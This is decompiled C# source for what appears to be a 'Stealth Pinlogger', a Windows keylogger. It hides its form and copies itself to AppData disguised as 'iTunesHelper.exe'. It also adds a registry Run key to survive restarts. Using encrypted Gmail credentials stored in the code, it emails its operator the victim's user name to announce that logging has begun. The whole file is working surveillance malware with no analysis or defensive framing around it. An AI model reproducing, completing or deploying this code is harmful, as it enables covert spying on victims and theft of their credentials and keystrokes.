using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace JavaCPL;

public class GForm0 : Form
{
	public string string_0 = "iTunesHelper";

	public string string_1 = Environment.GetEnvironmentVariable("AppData") + "\\iTunesHelper.exe";

	public bool bool_0 = true;

	public bool bool_1 = true;

	private static byte[] byte_0 = Encoding.ASCII.GetBytes("jaow82u2");

	private static byte[] byte_1 = Convert.FromBase64String("rpaSPvIvVLlrcmtzPU9/c67Gkj7yL1S5");

	private static int int_0 = 17;

	private IContainer icontainer_0;

	public static string smethod_0(string string_2)
	{
		byte[] bytes = Convert.FromBase64String(string_2);
		return Encoding.ASCII.GetString(bytes);
	}

	public static string smethod_1(string string_2)
	{
		byte[] array = Convert.FromBase64String(string_2);
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = byte_1;
		tripleDESCryptoServiceProvider.IV = byte_0;
		return Encoding.UTF8.GetString(tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(array, 0, array.Length));
	}

	public void method_0()
	{
		try
		{
			string text = AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName;
			if (!File.Exists(string_1))
			{
				File.Copy(text, string_1);
			}
			else
			{
				if (text.Equals(string_1))
				{
					return;
				}
				if (File.Exists(string_1))
				{
					File.Delete(string_1);
				}
				File.Copy(text, string_1);
			}
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(string_0, string_1);
			registryKey.Close();
		}
		catch (Exception)
		{
		}
	}

	protected override void vmethod_0(ref Message message_0)
	{
		while (bool_1)
		{
			bool_1 = false;
		}
		try
		{
			if (((Message)(ref message_0)).get_Msg() == int_0 && bool_0)
			{
				method_0();
			}
			((Form)this).WndProc(ref message_0);
		}
		catch (Exception)
		{
			bool_1 = true;
		}
	}

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(IntPtr intptr_0, string string_2);

	public GForm0()
	{
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_Location(new Point(-2000, -2000));
		((Form)this).set_Size(new Size(1, 1));
		((Form)this).set_Opacity(0.0);
		try
		{
			MailMessage mailMessage = new MailMessage();
			SmtpClient smtpClient = new SmtpClient
			{
				Host = "smtp.gmail.com",
				Port = 587,
				EnableSsl = true,
				Credentials = new NetworkCredential(smethod_1("q+qXpTfJ2Lw3fNTWkOrEFiFP9fHUjzwQ"), smethod_1("LL93k6srGyriueZnCr5LbA=="))
			};
			mailMessage.To.Add(smethod_1("q+qXpTfJ2Lw3fNTWkOrEFiFP9fHUjzwQ"));
			mailMessage.From = new MailAddress(smethod_1("q+qXpTfJ2Lw3fNTWkOrEFiFP9fHUjzwQ"));
			mailMessage.Subject = "Stealth Pinlogger Successfully Ran On: " + WindowsIdentity.GetCurrent().Name.ToString();
			mailMessage.Body = "The Pinlogger has successfully ran on: " + WindowsIdentity.GetCurrent().Name.ToString() + ". You Should Be Receiving Logs From Him Soon!";
			smtpClient.Send(mailMessage);
		}
		catch (Exception)
		{
		}
		while (bool_1)
		{
			bool_1 = false;
		}
		try
		{
			if (bool_0)
			{
				method_0();
			}
			while (!GClass4.smethod_7())
			{
				Thread.Sleep(100);
			}
			Thread thread = new Thread(GClass2.smethod_0);
			thread.Start();
			GClass0.smethod_0();
			method_1();
		}
		catch (Exception)
		{
			bool_1 = true;
		}
	}

	protected override void vmethod_1(bool bool_2)
	{
		if (bool_2 && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(bool_2);
	}

	private void method_1()
	{
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_Location(new Point(-2000, -2000));
		((Form)this).set_Size(new Size(1, 1));
		((Form)this).set_Opacity(0.0);
	}
}
